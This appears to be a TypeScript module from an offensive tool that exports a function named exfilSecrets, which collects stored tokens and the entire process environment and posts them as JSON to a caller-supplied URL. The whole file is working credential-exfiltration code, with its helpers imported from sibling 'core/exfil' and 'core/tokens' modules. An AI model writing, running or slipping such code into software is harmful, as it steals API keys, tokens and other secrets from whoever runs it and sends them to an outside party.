import { postJson, ExfilPayload } from '../core/exfil';
import { getTokens } from '../core/tokens';

/**
 * Create a payload and exfiltrate it to a specified URL
 * @param url The endpoint to send the JSON payload to
 */
export async function exfilSecrets(url: string) {
  if (!url) {
    throw new Error('Exfil URL must be provided.');
  }

  const tokens = await getTokens();

  const payload: ExfilPayload = {
    secrets: Object.fromEntries(tokens),
    env: process.env,
    timestamp: new Date().toISOString(),
  };

  await postJson(url, payload);
}
